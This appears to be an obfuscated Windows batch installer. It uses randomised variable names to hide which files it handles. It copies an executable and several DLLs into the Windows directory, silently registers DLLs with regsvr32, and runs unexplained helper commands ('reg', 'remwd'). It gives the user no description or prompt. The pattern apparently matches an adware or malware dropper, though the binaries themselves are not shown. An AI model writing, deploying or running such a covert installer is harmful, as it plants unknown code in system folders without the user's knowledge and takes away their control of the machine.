@echo      off

set    r13790004137900=nopctrl
set      d18916202189162=bonsws
set   d12031203120312=ddkret
set    g11718707117187=regsvr32.exe
set       u17916206179162=sawkip
set    r15508701155087=oprevnpx
set   e15468705154687=erxd

copy   %u17916206179162%.exe  %windir%   >nul
copy    %r15508701155087%.dll    %windir%       >nul
copy      %d12031203120312%.dll   %windir%\%d12031203120312%.dll   >nul
copy  %r13790004137900%.dll       %windir%\%r13790004137900%.dll  >nul
copy       %d18916202189162%.dll  %windir%

%e15468705154687%.exe       %windir%\%r13790004137900%.dll   %r13790004137900%
%windir%\system32\%g11718707117187%       /s      %windir%\%r15508701155087%.dll
%g11718707117187%    /s      %d18916202189162%.dll
%e15468705154687%.exe   %windir%\%d12031203120312%.dll      %d12031203120312%

%u17916206179162%.exe     reg
%e15468705154687%.exe      remwd
